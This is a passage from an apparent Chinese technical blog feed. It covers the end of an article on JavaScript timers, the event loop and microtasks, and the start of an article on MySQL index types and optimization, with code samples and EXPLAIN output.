<p>可以看到前4层也不是标准的立刻执行，在第4层后间隔明显变大到4ms以上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 667</span><br><span class="line">1 669</span><br><span class="line">2 670</span><br><span class="line">3 672</span><br><span class="line">4 676</span><br><span class="line">5 681</span><br><span class="line">6 685</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Timers can be nested; after five such nested timers, however, the interval is forced to be at least four milliseconds.</p>
</blockquote>
<h3 id="特殊场景3：浏览器节流"><a href="#特殊场景3：浏览器节流" class="headerlink" title="特殊场景3：浏览器节流"></a>特殊场景3：浏览器节流</h3><p>为了优化后台tab的加载占用资源，浏览器对后台未激活的页面中定时器延迟限制为1s。<br>对追踪型脚本，如谷歌分析等，在当前页面，依然是4ms的延时限制，而后台tabs为10s。</p>
<h2 id="setInterval定时任务"><a href="#setInterval定时任务" class="headerlink" title="setInterval定时任务"></a>setInterval定时任务</h2><p>此时，我们会知道，setInterval会在每个定时器延时时间到了后，将一个新的事件fn放入事件队列，如果前面的任务执行太久，我们会看到连续的fn事件被执行而感觉不到时间预设间隔。</p>
<p>因此，我们要尽量避免使用setInterval，改用setTimeout来模拟循环定时任务。</p>
<h2 id="睡眠函数"><a href="#睡眠函数" class="headerlink" title="睡眠函数"></a>睡眠函数</h2><p>JS一直缺少休眠的语法，借助ES6新的语法，我们可以模拟这个功能，但是同样的这个方法因为借助了setTimeout也不能保证准确的睡眠延时：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    setTimeout(resolve, ms);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> sleep(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="async-await机制"><a href="#async-await机制" class="headerlink" title="async await机制"></a>async await机制</h3><p>async函数是Generator函数的语法糖，提供更方便的调用和语义，上面的使用可以替换为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">yield</span> sleep(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">var</span> g = test();</span><br><span class="line">test.next();</span><br></pre></td></tr></table></figure>

<p>但是调用使用更加复杂，因此一般我们使用async函数即可。但JS时如何实现睡眠函数的呢，其实就是提供一种执行时的中间状态暂停，然后将控制权移交出去，等控制权再次交回时，从上次的断点处继续执行。因此营造了一种睡眠的假象，其实JS主线程还可以在执行其他的任务。</p>
<p>Generator函数调用后会返回一个内部指针，指向多个异步任务的暂停点，当调用next函数时，从上一个暂停点开始执行。</p>
<h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>协程（coroutine）是指多个线程互相协作，完成异步任务的一种多任务异步执行的解决方案。他的运行流程：</p>
<ul>
<li>协程A开始执行</li>
<li>协程A执行到一半，进入暂停，执行权转移到协程B</li>
<li>协程B在执行一段时间后，将执行权交换给A</li>
<li>协程A恢复执行</li>
</ul>
<p>可以看到这也就是Generator函数的实现方案。</p>
<h2 id="宏任务和微任务"><a href="#宏任务和微任务" class="headerlink" title="宏任务和微任务"></a>宏任务和微任务</h2><p>一个JS的任务可以定义为：在标准执行机制中，即将被调度执行的所有代码块。</p>
<p>我们上面介绍了JS如何使用单线程完成异步多任务调用，但我们知道JS的异步任务分很多种，如setTimeout定时器、Promise异步回调任务等，它们的执行优先级又一样吗？</p>
<p>答案是不。JS在异步任务上有更细致的划分，它分为两种：</p>
<ul>
<li><p>宏任务（macrotask)包含：</p>
<ul>
<li>执行的一段JS代码块，如控制台、script元素中包含的内容。</li>
<li>事件绑定的回调函数，如点击事件。</li>
<li>定时器创建的回调，如setTimeout和setInterval。</li>
</ul>
</li>
<li><p>微任务（microtask）包含：</p>
<ul>
<li>Promise对象的thenable函数。</li>
<li>Nodejs中的process.nextTick函数。</li>
<li>JS专用的queueMicrotask()函数。</li>
</ul>
</li>
</ul>
<p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/%E5%AE%8F%E4%BB%BB%E5%8A%A1%E3%80%81%E5%BE%AE%E4%BB%BB%E5%8A%A1.png" alt="宏任务、微任务"></p>
<p>宏任务和微任务都有自身的事件循环机制，也拥有独立的事件队列（Event Queue），都会按照队列的顺序依次执行。但宏任务和微任务主要有两点区别：</p>
<ol>
<li>宏任务执行完成，在控制权交还给主线程执行其他宏任务之前，会将微任务队列中的所有任务执行完成。</li>
<li>微任务创建的新的微任务，会在下一个宏任务执行之前被继续遍历执行，直到微任务队列为空。</li>
</ol>
<h2 id="浏览器的进程和线程"><a href="#浏览器的进程和线程" class="headerlink" title="浏览器的进程和线程"></a>浏览器的进程和线程</h2><p>浏览器是多进程式的，每个页面和插件都是一个独立的进程，这样可以保证单页面崩溃或者插件崩溃不会影响到其他页面和浏览器整体的稳定运行。</p>
<p>它主要包括：</p>
<ol>
<li>主进程：负责浏览器界面显示和管理，如前进、后退，新增、关闭，网络资源的下载和管理。</li>
<li>第三方插件进程：当启用插件时，每个插件独立一个进程。</li>
<li>GPU进程：全局唯一，用于3D图形绘制。</li>
<li>Renderer渲染进程：每个页面一个进程，互不影响，执行事件处理、脚本执行、页面渲染。</li>
</ol>
<h3 id="单页面线程"><a href="#单页面线程" class="headerlink" title="单页面线程"></a>单页面线程</h3><p>浏览器的单个页面就是一个进程，指的就是Renderer进程，而进程中又包含有多个线程用于处理不同的任务，主要包括：</p>
<ol>
<li>GUI渲染线程：负责HTML和CSS的构建成DOM树，渲染页面，比如重绘。</li>
<li>JS引擎线程：JS内核，如Chrome的V8引擎，负责解析执行JS代码。</li>
<li>事件触发线程：如点击等事件存在绑定回调时，触发后会被放入宏任务事件队列。</li>
<li>定时触发器线程：setTimeout和setInterval的定时计数器，在时间到达后放入宏任务事件队列。</li>
<li>异步HTTP请求线程：XMLHTTPRequest请求后新开一个线程，等待状态改变后，如果存在回调函数，就将其放入宏任务队列。</li>
</ol>
<p>需要注意的是，GUI渲染进程和JS引擎进程互斥，两者只会同时执行一个。主要的原因是为了节流，因为JS的执行会可能多次改变页面，页面的改变也会多次调用JS，如resize。因此浏览器采用的策略是交替执行，每个宏任务执行完成后，执行GUI渲染，然后执行下一个宏任务。</p>
<h3 id="Webworker线程"><a href="#Webworker线程" class="headerlink" title="Webworker线程"></a>Webworker线程</h3><p>因为JS只有一个引擎线程，同时和GUI渲染线程互斥，因此在繁重任务执行时会导致页面卡住，所以在HTML5中支持了Webworker，它用于向浏览器申请一个新的子线程执行任务，并通过postMessage API来和worker线程通信。所以我们在繁重任务执行时，可以选择新开一个Worker线程来执行，并在执行结束后通信给主线程，这样不会影响页面的正常渲染和使用。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>JS是单线程、阻塞式执行语言。</li>
<li>JS通过事件循环机制来完成异步任务并发执行。</li>
<li>JS将任务细分为宏任务和微任务来提供执行优先级。</li>
<li>浏览器单页面为一个进程，包含的JS引擎线程和GUI渲染线程互斥，可以通过新开Web Worker线程来完成繁重的计算任务。</li>
</ol>
<p><img src="/articles/一文读懂JavaScript的并发模型和事件循环机制/%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0.png" alt="系统实现"></p>
<p>最后给大家出一个考题，可以猜下执行的输出结果来验证学习成果：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'before first microtask init'</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'first microtask'</span>);</span><br><span class="line">        resolve()</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">'finish first microtask'</span>)&#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'after first microtask init'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'second microtask'</span>);</span><br><span class="line">        setTimeout(resolve, ms);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'start task'</span>);</span><br><span class="line">    <span class="keyword">await</span> sleep(<span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'end task'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'add event'</span>), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'main thread'</span>);</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main thread</span><br><span class="line">start task</span><br><span class="line">before first microtask init</span><br><span class="line">first microtask</span><br><span class="line">after first microtask init</span><br><span class="line">second microtask</span><br><span class="line">finish first microtask</span><br><span class="line">add event</span><br><span class="line">end task</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/EventLoop" target="_blank" rel="noopener">并发模型与事件循环</a></li>
<li><a href="http://www.alloyteam.com/2016/05/javascript-timer/" target="_blank" rel="noopener">JavaScript 定时器与执行机制解析</a></li>
<li><a href="https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#timers" target="_blank" rel="noopener">timers-and-user-prompts</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/setTimeout" target="_blank" rel="noopener">Web API 接口参考- window.setTimeout</a></li>
<li><a href="http://es6.ruanyifeng.com/#docs/generator-async#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" target="_blank" rel="noopener">Generator 函数的异步应用</a></li>
<li><a href="https://juejin.im/post/5a6547d0f265da3e283a1df7#heading-7" target="_blank" rel="noopener">从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理</a></li>
</ul>
<style>.post-body .fancybox img{margin: 0 auto !important; }</style>]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>了解MySQL索引与优化</title>
    <url>/articles/%E4%BA%86%E8%A7%A3MySQL%E7%B4%A2%E5%BC%95%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>索引对查询的速度有着至关重要的影响，理解索引也是进行数据库性能调优的起点。考虑如下情况，假设数据库中一个表有10^6条记录，DBMS的页面大小为4K，并存储100条记录。如果没有索引，查询将对整个表进行扫描，最坏的情况下，如果所有数据页都不在内存，需要读取10^4个页面，如果这10^4个页面在磁盘上随机分布，需要进行10^4次I/O，假设磁盘每次I/O时间为10ms(忽略数据传输时间)，则总共需要100s(但实际上要好很多很多)。如果对之建立B-Tree索引，则只需要进行log100(10^6)=3次页面读取，最坏情况下耗时30ms。这就是索引带来的效果，很多时候，当你的应用程序进行SQL查询速度很慢时，应该想想是否可以建索引。进入正题：</p>
<h2 id="选择索引的数据类型"><a href="#选择索引的数据类型" class="headerlink" title="选择索引的数据类型"></a>选择索引的数据类型</h2><p>MySQL支持很多数据类型，选择合适的数据类型存储数据对性能有很大的影响。通常来说，可以遵循以下一些指导原则：</p>
<ul>
<li><p>越小的数据类型通常更好：越小的数据类型通常在磁盘、内存和CPU缓存中都需要更少的空间，处理起来更快。</p>
</li>
<li><p>简单的数据类型更好：整型数据比起字符，处理开销更小，因为字符串的比较更复杂。在MySQL中，应该用内置的日期和时间数据类型，而不是用字符串来存储时间；以及用整型数据类型存储IP地址。</p>
</li>
<li><p>尽量避免NULL：应该指定列为NOT NULL，除非你想存储NULL。在MySQL中，含有空值的列很难进行查询优化，因为它们使得索引、索引的统计信息以及比较运算更加复杂。你应该用0、一个特殊的值或者一个空串代替空值。</p>
</li>
</ul>
<h2 id="选择标识符"><a href="#选择标识符" class="headerlink" title="选择标识符"></a>选择标识符</h2><p>选择合适的标识符是非常重要的。选择时不仅应该考虑存储类型，而且应该考虑MySQL是怎样进行运算和比较的。一旦选定数据类型，应该保证所有相关的表都使用相同的数据类型。</p>
<p>(1) <strong>整型</strong>：通常是作为标识符的最好选择，因为可以更快的处理，而且可以设置为<em>AUTO_INCREMENT</em>。</p>
<p>(2) <strong>字符串</strong>：尽量避免使用字符串作为标识符，它们消耗更好的空间，处理起来也较慢。而且，通常来说，字符串都是随机的，所以它们在索引中的位置也是随机的，这会导致页面分裂、随机访问磁盘，聚簇索引分裂（对于使用聚簇索引的存储引擎）。</p>
<h2 id="索引入门"><a href="#索引入门" class="headerlink" title="索引入门"></a>索引入门</h2><p>对于任何DBMS，索引都是进行优化的最主要的因素。对于少量的数据，没有合适的索引影响不是很大，但是，当随着数据量的增加，性能会急剧下降。</p>
<p>如果对多列进行索引(组合索引)，列的顺序非常重要，MySQL仅能对索引最左边的前缀进行有效的查找。例如：</p>
<p>假设存在组合索引it1c1c2(c1,c2)，查询语句 <em>select * from t1 where c1=1 and c2=2</em> 能够使用该索引。查询语句 <em>select * from t1 where c1=1</em> 也能够使用该索引。但是，查询语句 <em>select * from t1 where c2=2</em> 不能够使用该索引，因为没有组合索引的引导列，即，要想使用c2列进行查找，必需出现c1等于某值。</p>
<p>索引是在存储引擎中实现的，而不是在服务器层中实现的。所以，每种存储引擎的索引都不一定完全相同，并不是所有的存储引擎都支持所有的索引类型。</p>
<h3 id="B-Tree索引"><a href="#B-Tree索引" class="headerlink" title="B-Tree索引"></a>B-Tree索引</h3><p>假设有如下一个表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> People (</span><br><span class="line">    last_name  <span class="built_in">varchar</span>(<span class="number">50</span>)    <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    first_name <span class="built_in">varchar</span>(<span class="number">50</span>)    <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    dob        <span class="built_in">date</span>           <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    gender     enum(<span class="string">'m'</span>, <span class="string">'f'</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">key</span>(last_name, first_name, dob)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>其索引包含表中每一行的<em>last_name</em>、<em>first_name</em>和<em>dob</em>列。其结构大致如下：</p>
<p><img src="/articles/了解MySQL索引与优化/0.png" alt> </p>
<p>索引存储的值按索引列中的顺序排列。可以利用B-Tree索引进行全关键字、关键字范围和关键字前缀查询，当然，如果想使用索引，你必须保证按索引的最左边前缀(leftmost prefix of the index)来进行查询。</p>
<p>(1) <strong>匹配全值(Match the full value)</strong>：对索引中的所有列都指定具体的值。例如，上图中索引可以帮助你查找出生于1960-01-01的Cuba Allen。</p>
<p>(2) <strong>匹配最左前缀(Match a leftmost prefix)</strong>：你可以利用索引查找last name为Allen的人，仅仅使用索引中的第1列。</p>
<p>(3) <strong>匹配列前缀(Match a column prefix)</strong>：例如，你可以利用索引查找last name以J开始的人，这仅仅使用索引中的第1列。</p>
<p>(4) <strong>匹配值的范围查询(Match a range of values)</strong>：可以利用索引查找last name在Allen和Barrymore之间的人，仅仅使用索引中第1列。</p>
<p>(5) <strong>匹配部分精确而其它部分进行范围匹配(Match one part exactly and match a range on another part)</strong>：可以利用索引查找last name为Allen，而first name以字母K开始的人。</p>
<p>(6) <strong>仅对索引进行查询(Index-only queries)</strong>：如果查询的列都位于索引中，则不需要读取元组的值。</p>
<p>由于B-树中的节点都是顺序存储的，所以可以利用索引进行查找(找某些值)，也可以对查询结果进行ORDER BY。当然，使用B-tree索引有以下一些限制：</p>
<ul>
<li><p>查询必须从索引的最左边的列开始。关于这点已经提了很多遍了。例如你不能利用索引查找在某一天出生的人。</p>
</li>
<li><p>不能跳过某一索引列。例如，你不能利用索引查找last name为Smith且出生于某一天的人。</p>
</li>
<li><p>存储引擎不能使用索引中范围条件右边的列。例如，如果你的查询语句为 WHERE last_name=”Smith” AND first_name LIKE ‘J%’ AND dob=’1976-12-23’ ，则该查询只会使用索引中的前两列，因为LIKE是范围查询。</p>
</li>
</ul>
<h3 id="Hash索引"><a href="#Hash索引" class="headerlink" title="Hash索引"></a>Hash索引</h3><p>MySQL中，只有Memory存储引擎显示支持hash索引，是Memory表的默认索引类型，尽管Memory表也可以使用B-Tree索引。Memory存储引擎支持非唯一hash索引，这在数据库领域是罕见的，如果多个值有相同的hash code，索引把它们的行指针用链表保存到同一个hash表项中。</p>
<p>假设创建如下一个表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> testhash (</span><br><span class="line">       fname <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">       lname <span class="built_in">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">       <span class="keyword">KEY</span> <span class="keyword">USING</span> <span class="keyword">HASH</span>(fname)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">MEMORY</span>;</span><br></pre></td></tr></table></figure>

<p>包含的数据如下：</p>
<p><img src="/articles/了解MySQL索引与优化/1.png" alt></p>
<p>假设索引使用hash函数f( )，如下：</p>
<pre><code>f(&apos;Arjen&apos;) = 2323

f(&apos;Baron&apos;) = 7437

f(&apos;Peter&apos;) = 8784

f(&apos;Vadim&apos;) = 2458</code></pre><p>此时，索引的结构大概如下：</p>
<p><img src="/articles/了解MySQL索引与优化/2.png" alt></p>
<p>Slots是有序的，但是记录不是有序的。当你执行</p>
<blockquote>
<p>SELECT lname FROM testhash WHERE fname=’Peter’;</p>
</blockquote>
<p>MySQL会计算’Peter’的hash值，然后通过它来查询索引的行指针。因为f(‘Peter’) = 8784，MySQL会在索引中查找8784，得到指向记录3的指针。</p>
<p>因为索引自己仅仅存储很短的值，所以，索引非常紧凑。Hash值不取决于列的数据类型，一个TINYINT列的索引与一个长字符串列的索引一样大。</p>
<p>Hash索引有以下一些限制：</p>
<ul>
<li><p>由于索引仅包含hash code和记录指针，所以，MySQL不能通过使用索引避免读取记录。但是访问内存中的记录是非常迅速的，不会对性造成太大的影响。</p>
</li>
<li><p>不能使用hash索引排序。</p>
</li>
<li><p>Hash索引不支持键的部分匹配，因为是通过整个索引值来计算hash值的。</p>
</li>
<li><p>Hash索引只支持等值比较，例如使用=，IN( )和&lt;=&gt;。对于WHERE price&gt;100并不能加速查询。</p>
</li>
</ul>
<h3 id="空间-R-Tree-索引"><a href="#空间-R-Tree-索引" class="headerlink" title="空间(R-Tree)索引"></a>空间(R-Tree)索引</h3><p>MyISAM支持空间索引，主要用于地理空间数据类型，例如GEOMETRY。</p>
<h3 id="全文-Full-text-索引"><a href="#全文-Full-text-索引" class="headerlink" title="全文(Full-text)索引"></a>全文(Full-text)索引</h3><p>全文索引是MyISAM的一个特殊索引类型，主要用于全文检索。</p>
<h2 id="高性能的索引策略"><a href="#高性能的索引策略" class="headerlink" title="高性能的索引策略"></a>高性能的索引策略</h2><h3 id="聚簇索引-Clustered-Indexes"><a href="#聚簇索引-Clustered-Indexes" class="headerlink" title="聚簇索引(Clustered Indexes)"></a>聚簇索引(Clustered Indexes)</h3><p>聚簇索引保证关键字的值相近的元组存储的物理位置也相同（所以字符串类型不宜建立聚簇索引，特别是随机字符串，会使得系统进行大量的移动操作），且一个表只能有一个聚簇索引。因为由存储引擎实现索引，所以，并不是所有的引擎都支持聚簇索引。目前，只有solidDB和InnoDB支持。</p>
<p>聚簇索引的结构大致如下：</p>
<p><img src="/articles/了解MySQL索引与优化/3.png" alt></p>
<p>注：叶子页面包含完整的元组，而内节点页面仅包含索引的列(索引的列为整型)。一些DBMS允许用户指定聚簇索引，但是MySQL的存储引擎到目前为止都不支持。InnoDB对主键建立聚簇索引。如果你不指定主键，InnoDB会用一个具有唯一且非空值的索引来代替。如果不存在这样的索引，InnoDB会定义一个隐藏的主键，然后对其建立聚簇索引。一般来说，DBMS都会以聚簇索引的形式来存储实际的数据，它是其它二级索引的基础。</p>
<h3 id="InnoDB和MyISAM的数据布局的比较"><a href="#InnoDB和MyISAM的数据布局的比较" class="headerlink" title="InnoDB和MyISAM的数据布局的比较"></a>InnoDB和MyISAM的数据布局的比较</h3><p>为了更加理解聚簇索引和非聚簇索引，或者primary索引和second索引(MyISAM不支持聚簇索引)，来比较一下InnoDB和MyISAM的数据布局，对于如下表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> layout_test (</span><br><span class="line">    col1 <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    col2 <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span>(col1),</span><br><span class="line">    <span class="keyword">KEY</span>(col2)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>假设主键的值位于1—10,000之间，且按随机顺序插入，然后用OPTIMIZE TABLE进行优化。col2随机赋予1—100之间的值，所以会存在许多重复的值。</p>
<p><strong>(1) MyISAM的数据布局</strong></p>
<p>其布局十分简单，MyISAM按照插入的顺序在磁盘上存储数据，如下：</p>
<p><img src="/articles/了解MySQL索引与优化/4.png" alt></p>
<p>注：左边为行号(row number)，从0开始。因为元组的大小固定，所以MyISAM可以很容易的从表的开始位置找到某一字节的位置。</p>
<p>据些建立的primary key的索引结构大致如下：</p>
<p><img src="/articles/了解MySQL索引与优化/5.png" alt></p>
<p>注：MyISAM不支持聚簇索引，索引中每一个叶子节点仅仅包含行号(row number)，且叶子节点按照col1的顺序存储。</p>
<p>来看看col2的索引结构：</p>
<p><img src="/articles/了解MySQL索引与优化/6.png" alt></p>
<p>实际上，在MyISAM中，primary key和其它索引没有什么区别。Primary key仅仅只是一个叫做PRIMARY的唯一，非空的索引而已。</p>
<p><strong>(2) InnoDB的数据布局</strong></p>
<p>InnoDB按聚簇索引的形式存储数据，所以它的数据布局有着很大的不同。它存储表的结构大致如下：</p>
<p><img src="/articles/了解MySQL索引与优化/7.png" alt></p>
<p>注：聚簇索引中的每个叶子节点包含primary key的值，事务ID和回滚指针(rollback pointer)——用于事务和MVCC，和余下的列(如col2)。</p>
<p>相对于MyISAM，二级索引与聚簇索引有很大的不同。InnoDB的二级索引的叶子包含primary key的值，而不是行指针(row pointers)，这减小了移动数据或者数据页面分裂时维护二级索引的开销，因为InnoDB不需要更新索引的行指针。其结构大致如下：</p>
<p><img src="/articles/了解MySQL索引与优化/8.png" alt></p>
<p>聚簇索引和非聚簇索引表的对比：</p>
<p><img src="/articles/了解MySQL索引与优化/9.png" alt></p>
<h3 id="按primary-key的顺序插入行-InnoDB"><a href="#按primary-key的顺序插入行-InnoDB" class="headerlink" title="按primary key的顺序插入行(InnoDB)"></a>按primary key的顺序插入行(InnoDB)</h3><p>如果你用InnoDB，而且不需要特殊的聚簇索引，一个好的做法就是使用代理主键(surrogate key)——独立于你的应用中的数据。最简单的做法就是使用一个AUTO_INCREMENT的列，这会保证记录按照顺序插入，而且能提高使用primary key进行连接的查询的性能。应该尽量避免随机的聚簇主键，例如，字符串主键就是一个不好的选择，它使得插入操作变得随机。</p>
<h3 id="覆盖索引-Covering-Indexes"><a href="#覆盖索引-Covering-Indexes" class="headerlink" title="覆盖索引(Covering Indexes)"></a>覆盖索引(Covering Indexes)</h3><p>如果索引包含满足查询的所有数据，就称为覆盖索引。覆盖索引是一种非常强大的工具，能大大提高查询性能。只需要读取索引而不用读取数据有以下一些优点：</p>
<ul>
<li><p>索引项通常比记录要小，所以MySQL访问更少的数据；</p>
</li>
<li><p>索引都按值的大小顺序存储，相对于随机访问记录，需要更少的I/O；</p>
</li>
<li><p>大多数据引擎能更好的缓存索引。比如MyISAM只缓存索引。</p>
</li>
<li><p>覆盖索引对于InnoDB表尤其有用，因为InnoDB使用聚集索引组织数据，如果二级索引中包含查询所需的数据，就不再需要在聚集索引中查找了。</p>
</li>
</ul>
<p>覆盖索引不能是任何索引，只有B-TREE索引存储相应的值。而且不同的存储引擎实现覆盖索引的方式都不同，并不是所有存储引擎都支持覆盖索引(Memory和Falcon就不支持)。</p>
<p>对于索引覆盖查询(index-covered query)，使用EXPLAIN时，可以在Extra一列中看到“Using index”。例如，在sakila的inventory表中，有一个组合索引(store_id,film_id)，对于只需要访问这两列的查询，MySQL就可以使用索引，如下：</p>
<pre><code>mysql&gt; EXPLAIN SELECT store_id, film_id FROM sakila.inventory\G

*************************** 1. row ***************************

id: 1

select_type: SIMPLE

table: inventory

type: index

possible_keys: NULL

key: idx_store_id_film_id

key_len: 3

ref: NULL

rows: 5007

Extra: Using index

1 row in set (0.17 sec)</code></pre><p>在大多数引擎中，只有当查询语句所访问的列是索引的一部分时，索引才会覆盖。但是，InnoDB不限于此，InnoDB的二级索引在叶子节点中存储了primary key的值。因此，sakila.actor表使用InnoDB，而且对于是last_name上有索引，所以，索引能覆盖那些访问actor_id的查询，如：</p>
<pre><code>mysql&gt; EXPLAIN SELECT actor_id, last_name from sakila.actor where last_name = &apos;HOPPER&apos; \G

*************************** 1. row ***************************

id: 1

select_type: SIMPLE

table: actor

type: ref

possible_keys: idx_actor_last_name

key: idx_actor_last_name

key_len: 137

ref: const

rows: 2

Extra: Using where; Using index</code></pre><h3 id="利用索引进行排序"><a href="#利用索引进行排序" class="headerlink" title="利用索引进行排序"></a>利用索引进行排序</h3><p>MySQL中，有两种方式生成有序结果集：一是使用filesort，二是按索引顺序扫描。利用索引进行排序操作是非常快的，而且可以利用同一索引同时进行查找和排序操作。当索引的顺序与ORDER BY中的列顺序相同且所有的列是同一方向(全部升序或者全部降序)时，可以使用索引来排序。如果查询是连接多个表，仅当ORDER BY中的所有列都是第一个表的列时才会使用索引。其它情况都会使用filesort。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> actor(</span><br><span class="line">    actor_id <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">    <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span>(actor_id), </span><br><span class="line">    <span class="keyword">KEY</span> (<span class="keyword">name</span>) </span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span>;</span><br><span class="line"><span class="comment">/* insert data */</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'cat01'</span>,<span class="string">'1234567'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'cat02'</span>,<span class="string">'1234567'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'ddddd'</span>,<span class="string">'1234567'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> actor(<span class="keyword">name</span>,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'aaaaa'</span>,<span class="string">'1234567'</span>);</span><br></pre></td></tr></table></figure>

<pre><code>mysql&gt; explain select actor_id from actor order by actor_id \G

*************************** 1. row ***************************

id: 1

select_type: SIMPLE

table: actor

type: index

possible_keys: NULL

key: PRIMARY

key_len: 4

ref: NULL

rows: 4

Extra: Using index

1 row in set (0.00 sec)

mysql&gt; explain select actor_id from actor order by password \G

*************************** 1. row ***************************

id: 1

select_type: SIMPLE

table: actor

type: ALL

possible_keys: NULL

key: NULL

key_len: NULL

ref: NULL

rows: 4

Extra: Using filesort

1 row in set (0.00 sec)

mysql&gt; explain select actor_id from actor order by name \G

*************************** 1. row ***************************

id: 1

select_type: SIMPLE

table: actor

